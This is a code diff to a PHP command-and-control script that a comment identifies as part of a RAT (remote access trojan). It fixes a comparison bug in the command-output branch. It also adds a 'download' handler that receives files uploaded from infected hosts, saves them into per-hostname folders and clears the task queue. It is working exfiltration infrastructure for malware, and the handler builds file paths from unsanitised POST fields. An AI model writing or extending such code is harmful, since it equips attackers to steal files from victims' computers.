@@ -43,7 +43,7 @@
       unlink($webrootPath . $taskSecondary);
     }
     # Else if the task action is command execution
-    elseif ($taskAction = "command")
+    elseif ($taskAction == "command")
     {
       $output = urldecode($_POST["output"]);           # Could have spaces or special characters so we urldecode()
       $error = urldecode($_POST["error"]);             # Could have spaces or special characters so we urldecode()
@@ -86,9 +86,39 @@
     # Else if the task action is a remote file download
     elseif ($taskAction == "download")
     {
+      $hostname = $_POST["hostname"]; # Stores hostname
 
-      # Add in functionality at a later date
+      # Does the downloads/<SYSTEM> directory exist?
+      # If not we create the directory
+      if (!file_exists($downloadsPath . $hostname))
+      {
+        mkdir($downloadsPath . $hostname);
+      }
 
+      # Moves uploaded file from the /tmp directory to the downloads/<SYSTEM> directory
+      $filename = $_FILES["download"]["name"];
+      $tempFilePath = $_FILES["download"]["tmp_name"];
+      $fileDestination = $downloadsPath . $hostname . "/" . $filename;
+      move_uploaded_file($tempFilePath, $fileDestination);
+
+      # Updates status to "Y" in "output" table
+      # This informs the RAT user that the task completed
+      $statement = $dbConnection->prepare("UPDATE output SET status = :status WHERE id = :id AND action = :action AND secondary = :secondary");
+      $statement->bindValue(":status", "Y");
+      $statement->bindValue(":id", $taskID);
+      $statement->bindValue(":action", $taskAction);
+      $statement->bindValue(":secondary", $taskSecondary);
+      $statement->execute();
+
+      # Deletes task
+      $statement = $dbConnection->prepare("DELETE FROM tasks WHERE id = :id AND action = :action AND secondary = :secondary");
+      $statement->bindValue(":id", $taskID);
+      $statement->bindValue(":action", $taskAction);
+      $statement->bindValue(":secondary", $taskSecondary);
+      $statement->execute();
+
+      # Kills database connection
+      $statement->connection = null;
     }
   }
 ?>
